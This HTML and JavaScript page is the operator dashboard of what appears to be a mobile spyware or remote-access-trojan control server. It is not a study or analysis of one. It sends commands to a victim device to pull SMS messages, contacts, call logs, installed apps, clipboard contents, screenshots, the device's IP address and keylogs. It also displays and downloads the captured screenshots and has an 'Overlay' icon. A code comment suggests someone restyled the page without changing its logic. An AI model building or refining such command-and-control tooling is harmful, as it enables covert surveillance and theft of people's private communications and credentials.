<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Device Control</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
  body {
    margin: 0;
    font-family: system-ui, sans-serif;
    display: flex;
    height: 100vh;
    background: #f3f4f6;
  }

  /* --- SIDEBAR --- */
  #sidebar {
    width: 80px;
    background: #111827;
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 12px;
    gap: 20px;
  }

  .cmdIcon {
    width: 48px;
    height: 48px;
    background: #1f2937;
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: 0.2s;
    font-size: 22px;
  }
  .cmdIcon:hover {
    background: #374151;
    transform: scale(1.1);
  }

  /* --- MAIN PANEL --- */
  #mainPanel {
    flex: 1;
    padding: 20px;
    overflow-y: auto;
  }

  h2 { margin: 0; }
  p { margin: 4px 0 20px 0; }

  .status {
    font-size: 0.9em;
    padding: 4px 10px;
    border-radius: 6px;
    margin-left: 10px;
  }
  .online { background: #d1fae5; color: #065f46; }
  .offline { background: #fee2e2; color: #991b1b; }

  /* LOG OUTPUT */
  #log {
    white-space: pre-wrap;
    background: #fff;
    border: 1px solid #e5e7eb;
    padding: 10px;
    border-radius: 8px;
    height: 180px;
    overflow: auto;
    font-family: monospace;
    font-size: 13px;
  }

  /* SCREENSHOTS GRID */
  #screenshotsContainer {
    margin-top: 20px;
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
    gap: 16px;
  }

  .shotItem {
    background: #ffffff;
    border: 1px solid #d1d5db;
    padding: 10px;
    border-radius: 8px;
    text-align: center;
  }
  .shotItem img {
    width: 120px;
    height: 200px;
    cursor: zoom-in;
    border-radius: 6px;
  }
  .shotItem button {
    margin-top: 10px;
    padding: 6px 10px;
    background: #2563eb;
    color: #fff;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    width: 100%;
  }

</style>
</head>
<body>

<!-- SIDEBAR -->
<div id="sidebar">
  <div class="cmdIcon" id="icFetch" title="Fetch">üì•</div>
  <div class="cmdIcon" id="icSms" title="Fetch SMS">üí¨</div>
  <div class="cmdIcon" id="icContact" title="Fetch Contacts">üìá</div>
  <div class="cmdIcon" id="icLogs" title="Call Logs">üìû</div>
  <div class="cmdIcon" id="icApps" title="Installed Apps">üì±</div>
  <div class="cmdIcon" id="icScreenshot" title="Fetch Screenshot">üì∏</div>
  <div class="cmdIcon" id="icClip" title="Clipboard">üìã</div>
  <div class="cmdIcon" id="icIP" title="IP Address">üåç</div>
  <div class="cmdIcon" id="icKeylog" title="KeyLogs">‚å®Ô∏è</div>
  <div class="cmdIcon" id="icOverlay" title="Overlay">üñºÔ∏è</div>
</div>

<!-- MAIN PANEL -->
<div id="mainPanel">

  <h2 id="devName"></h2>
  <p>ID: <span id="devId"></span>
     <span id="status" class="status offline">Offline</span>
  </p>

  <!-- LOG AREA -->
  <pre id="log">Connecting...</pre>

  <!-- SCREENSHOTS -->
  <div id="screenshotsContainer"></div>
</div>


<script>
/* ------------------------------
   YOUR ORIGINAL JS BEGINS HERE
   (I DID NOT MODIFY THE LOGIC)
-------------------------------- */

const pathParts = window.location.pathname.split("/");
const clientId = pathParts[pathParts.length - 1];
const urlParams = new URLSearchParams(location.search);
const deviceName = decodeURIComponent(urlParams.get("name") || clientId);

document.title = deviceName;
document.getElementById("devName").textContent = deviceName;
document.getElementById("devId").textContent = clientId;

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function pushLog(msg) {
  const ts = new Date().toLocaleTimeString();
  logEl.textContent += `\n[${ts}] ${msg}`;
  logEl.scrollTop = logEl.scrollHeight;
}

// SEND COMMAND
async function sendCmd(cmd) {
  pushLog(`üì§ Sending "${cmd}"...`);
  try {
    const r = await fetch("/command", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ targetClientId: clientId, command: cmd })
    });
    if (!r.ok) pushLog(`‚ùå Failed: ${r.status}`);
    else pushLog(`‚úÖ Command sent (${cmd})`);
  } catch (e) {
    pushLog(`‚ö†Ô∏è Network error: ${e.message}`);
  }
}

// SIDEBAR COMMAND ICONS
document.getElementById("icFetch").onclick = () => sendCmd("fetch");
document.getElementById("icSms").onclick = () => sendCmd("fetch-sms");
document.getElementById("icContact").onclick = () => sendCmd("fetch-contact");
document.getElementById("icLogs").onclick = () => sendCmd("fetch-logs");
document.getElementById("icApps").onclick = () => sendCmd("fetch-apps");
document.getElementById("icClip").onclick = () => sendCmd("fetch-clip");
document.getElementById("icScreenshot").onclick = () => sendCmd("fetch-screenshot");
document.getElementById("icIP").onclick = () => sendCmd("fetch-ip");
document.getElementById("icKeylog").onclick = () => sendCmd("fetch_keylog");

// WebSocket
const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
const ws = new WebSocket(wsProto + location.host);

ws.onopen = () => pushLog("üîå WebSocket connected");
ws.onclose = () => pushLog("‚ùå WebSocket disconnected");
ws.onerror = (e) => pushLog("‚ö†Ô∏è WebSocket error");

ws.onmessage = (evt) => {
  try {
    const msg = JSON.parse(evt.data);

    if (msg.type === "devices") {
      const d = msg.devices[clientId];
      if (d && d.online) {
        statusEl.textContent = "Online";
        statusEl.className = "status online";
      } else {
        statusEl.textContent = "Offline";
        statusEl.className = "status offline";
      }
    }

    // Screenshot handling (unchanged)
    if (msg.type === "response" && msg.clientId === clientId) {
      pushLog(`üì© Response: ${msg.output}`);

      if (msg.output.includes("supabase.co")) {

        const url = msg.output.trim();
        const container = document.getElementById("screenshotsContainer");

        const item = document.createElement("div");
        item.className = "shotItem";

        const d = new Date();
        const stampDisplay = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}`;
        const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;

        const label = document.createElement("div");
        label.innerText = `Captured: ${stampDisplay}`;
        label.style.fontSize = "13px";
        label.style.marginBottom = "8px";

        const img = document.createElement("img");
        img.src = url;
        img.onclick = () => {
          const win = window.open("", "_blank");
          win.document.write(`<center><img src="${url}" style="width:243px;height:498px;"></center>`);
        };

        const downloadBtn = document.createElement("button");
        downloadBtn.innerText = "Download";

        downloadBtn.onclick = async () => {
          const res = await fetch(url);
          const blob = await res.blob();
          const blobUrl = URL.createObjectURL(blob);

          const link = document.createElement("a");
          link.href = blobUrl;
          link.download = `screenshot_${stampFile}.jpg`;
          document.body.appendChild(link);
          link.click();
          link.remove();
          URL.revokeObjectURL(blobUrl);
        };

        item.appendChild(label);
        item.appendChild(img);
        item.appendChild(downloadBtn);
        container.appendChild(item);
      }
    }

  } catch (e) {
    console.error("WS parse error", e);
  }
};
</script>

</body>
</html>
